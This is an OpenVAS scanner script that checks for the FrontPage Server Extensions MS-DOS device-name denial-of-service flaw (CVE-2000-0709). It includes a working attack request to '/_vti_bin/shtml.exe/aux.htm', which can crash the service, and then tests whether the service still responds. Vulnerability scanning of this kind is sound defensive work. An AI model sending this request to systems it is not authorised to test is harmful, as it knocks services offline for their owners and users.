##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_frontpage_ext_device_name_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Microsoft FrontPage Server Extensions MS-DOS Device Name DoS Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to cause denial of service
  conditions.
  Impact Level: Application";
tag_affected = "Microsoft FrontPage 2000 Server Extensions 1.1";
tag_insight = "The flaw is due to an error in the 'shtml.exe' component, which
  allows remote attackers to cause a denial of service in some components
  by requesting a URL whose name includes a standard DOS device name.";
tag_solution = "Upgrade to Microsoft FrontPage 2000 Server Extensions 1.2 or later,
  For updates refer to http://office.microsoft.com";
tag_summary = "This host is running Microsoft FrontPage Server Extensions and is
  prone to denial of service vulnerability.";

if(description)
{
  script_id(902839);
  script_version("$Revision: 12 $");
  script_bugtraq_id(1608);
  script_cve_id("CVE-2000-0709");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-05-24 17:17:17 +0530 (Thu, 24 May 2012)");
  script_name("Microsoft FrontPage Server Extensions MS-DOS Device Name DoS Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/396");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/5124");
  script_xref(name : "URL" , value : "http://www.securiteam.com/windowsntfocus/5NP0N0U2AA.html");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2000-08/0288.html");

  script_description(desc);
  script_summary("Check if FrontPage Extension is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web Servers");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/iis");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
req = "";
res = "";
url = "/_vti_bin/shtml.exe";

## Get HTTP Port
port = get_http_port(default:80);
if(! port){
  exit(0);
}

## Confirm FrontPage Server Extensions are running
if(http_vuln_check(port: port, url: url, check_header: TRUE,
   pattern:"FrontPage Server Extensions", extra_check:"Server: Microsoft-IIS"))
{
  ## Send the attack
  req = http_get(item: "/_vti_bin/shtml.exe/aux.htm", port: port);
  http_send_recv(port: port, data: req);

  ## Try to access shtml.exe
  req = http_get(item: url, port: port);
  res = http_send_recv(port: port, data: req);

  if(! res)
  {
    ## FrontPage Server Extensions are not running
    security_warning(port);
  }
}
